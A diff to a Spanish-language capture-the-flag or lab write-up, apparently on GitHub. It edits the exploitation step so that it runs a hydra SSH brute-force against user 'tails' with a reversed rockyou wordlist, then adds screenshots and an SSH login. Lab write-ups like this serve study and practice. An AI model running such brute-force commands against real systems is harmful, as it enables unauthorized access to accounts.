@@ -31,8 +31,14 @@ lo que nos da una pista del nombre de usuario.
 ![URL](https://github.com/user-attachments/assets/f8d0c398-0d3b-4523-ba25-aa041fe057b9)
 
 2.Explotación
-Usamos una herramienta de fuerza bruta para obtener acceso al usuario tails utilizando rockyou.
-sudo hydra -l tails -P /usr/share/wordlists/rockyou.txt.gz (IP) ssh
+Usamos una herramienta de fuerza bruta para obtener acceso al usuario tails utilizando rockyou invertido.
+sudo hydra -l tails -P invertido.txt ssh://(IP)
+
+![Captura de pantalla 2024-11-17 170210](https://github.com/user-attachments/assets/0c45b4b4-2a83-44e5-b3cc-1488d57aed47)
+
+![Captura de pantalla 2024-11-17 170218](https://github.com/user-attachments/assets/bc88ab97-a730-4238-8e77-558fbade388c)
+
+![Captura de pantalla 2024-11-17 170231](https://github.com/user-attachments/assets/99e8a652-e97c-4ba6-84a5-fe3d3fa2b08d)
 
 Nos conectamos via SSH con las credenciales obtenidas.
 ssh tails@(IP)
